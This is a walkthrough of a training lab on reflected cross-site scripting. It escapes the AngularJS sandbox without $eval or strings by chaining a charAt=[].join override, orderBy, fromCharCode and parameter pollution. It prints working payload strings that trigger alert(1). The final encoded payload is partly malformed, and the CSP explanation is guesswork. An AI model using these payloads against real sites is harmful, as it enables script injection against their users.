**Lab Description:**
This lab uses AngularJS in an unusual way where the `$eval` function is not available and you will be unable to use any strings in AngularJS

To solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the `alert` function without using the `$eval` function.

---

## Introduction

This lab featured a reflected Cross-Site Scripting (XSS) vulnerability within a search function built on the AnjularJS framework. The core challenge was to bypass the AngularJS sandbox under strict constraints: the `$eval` function was disabled, and string literals were prohibited. This write-up details the methodology, failed attempts, and the final advanced payload constructed to successfully escape the sandbox and achieve code execution.

In this write-up, I will explain the step-by-step process I followed in my attempts, and I will deconstruct the final payload to understand each step.

---

## 1. Reconnaissance

In this step, I searched for injection vector in system. Vulnerability is a reflected XSS in search function, i searched for any string and analysing the code source with dev tools.

Identify the `<script>` ng
<img width="1525" height="112" alt="image" src="https://github.com/user-attachments/assets/3674f5a6-c961-4004-9f84-f1f3e1f5163c" />


```javascript
angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
                            $scope.query = {};
                            var key = 'search';
                            $scope.query[key] = 'x';
                            $scope.value = $parse(key)($scope.query);
                        });
```

An attempt to inject a simple expression like `{{7*7}}` was unsuccessful, as the input was treated as a literal string. 

I try escape for String with a single quote encoded `&apos;x`, and result is:

<img width="819" height="209" alt="image" src="https://github.com/user-attachments/assets/4fd4c3cf-807c-40d8-9f3a-d55ab9794560" />


I note in the script, char `&` is null, and duplicate the variables in block.  

```javascript
angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
                            $scope.query = {};
                            var key = 'search';
                            $scope.query[key] = '';
                            $scope.value = $parse(key)($scope.query);
                            var key = 'apos;x';
                            $scope.query[key] = '';
                            $scope.value = $parse(key)($scope.query);
                        });
```

However, a ctritical discovery was made when testing special characters, By injecting `&7*7`, I observed that the application was vulnerable to `HTTP Parameter Pollution (HPP)`. The `&` character caused the application create a new, unexpected parameter named ``7*7`` with a value of `49`, as seen in the rendered HTML.

<img width="893" height="248" alt="image" src="https://github.com/user-attachments/assets/d12460a7-c397-4350-84d7-93cb3e192fa5" />


The confirmed that the injection point was not limited to the `search` parameter's value, but that I could inject new parameters directly into the server-side logic. This became the core strategy for the exploit

---

## 2. Payload and Exploit.

**Attempt #1:** `orderBy` with `fromCharCode`

The lab's constraints (`no $eval`, `no strings`) led to the first advanced payload attempt. The `orderBy` filter was chosen as an alternative execution sink, and `String.fromCharCode()` was use to dynamically build the `alert(1)` string.

**Payload:** `[123]|orderBy:(true.toString()).constructor.fromCharCode(97,108,101,114,116,40,49,41)()`
- `[123]|orderBy:`: Alternative method for `eval`
- `(true.toString())`: access the String "true"
- `constructor.fromCharCode(97,108,101,114,116,40,49,41)()`: access the global using constructor and called the `alert` using the char codes. The final use `()` for function 

**Result:** This payload caused the application to break, displaying the raw template `{{value}}`. This was a crucial clue, suggesting that while the expression was being evaluated, a final security layer (likely a Content Security Policy - CSP) was blocking the execution, causing a fatal error 

<img width="986" height="63" alt="image" src="https://github.com/user-attachments/assets/1e823938-6ea6-4665-82c3-fd8f933c55af" />


**Attempt #2:** Combinated with `charAt=[].join`

The second payload combinate the other method one of most used for escape sandbox:
`'a'.constructor.prototype.charAt=[].join;`

This payload override the ``String.prototype.charAt`` function with ``[].join``, if sandbox validate to sintaxe, received the full string, the lojic for comparate in JavaScript 'a' <= your_payload return `true`, in this case the expressions is valid.

**Payload:**
```javascript
&true.toString().constructor.prototype.charAt=[].join;(true.toString()).constructor.fromCharCode(97,108,101,114,116,40,49,41)()
```

But, null result

**The Final Payload: Combining Techniques**

The final solution required chaining multiple techniques. To bypass the sandbox's syntax validation which blocked special characters like `=`, the `charAt` bypass was necessary.

The goal was to execute the expression `x=alert(1)=1`. The `fromCharCode` method was used to build the string `x=alert(1)`. This entire structure was then passed to the `orderBy` filter.

In this case, the payload final is:

```javascript
&true.toString().constructor.prototype.charAt=[].join;[123]|orderBy:(true.toString()).constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

An initial attempt failed. I observed that the server-side logic was spliting the payload at the `=` character due to the HPP vulnerability. To bypass this, the first `=` in the payload (`charAt=[].join`) had to be URL-encoded as `%3D`.

```javascript
angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
                            $scope.query = {};
                            var key = 'search';
                            $scope.query[key] = '1';
                            $scope.value = $parse(key)($scope.query);
                            var key = 'toString().constructor.prototype.charAt';
                            $scope.query[key] = '[].join;[123]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1';
                            $scope.value = $parse(key)($scope.query);
                        });
```

**Final Successful Payload (URL Encoded):**

```javascript
&true.toString().constructor.prototype.charAt%3D%[].join;[123]|orderBy:(true.toString()).constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

**Result:** This successfully solved the lab. Although the `alert()` pop-up was not visually triggered (likely due to the CSP), the lab's backend detected the successful sandbox escape and registered the solution. This is a common behavior in modern security labs, where the proof of concept is the ability to force a security violation, not necessarily a visible alert.

<img width="1169" height="313" alt="image" src="https://github.com/user-attachments/assets/cc623e14-1b07-4f90-8471-ff7757c0f0f3" />
<img width="855" height="211" alt="image" src="https://github.com/user-attachments/assets/d22beaa3-b45f-414c-9ce7-96bede68f346" />



---

## Conclusion

The solution to this lab required a multi-layered approach, mirroring real-world application security. It was not enough to know a single technique; the key was to diagnose the application's behavior at each step and chain multiple exploits together. The successful exploit demonstrated a bypass of string limitations (`fromCharCode`), execution sink restrictions (`orderBy`), sandbox syntax validation (`cahrAt` bypass), and server-side parsing quirks (HPP and URL encoding). This proves that modern web application hacking requires a deep understading of the full request-response cycle and framework specific security features. 
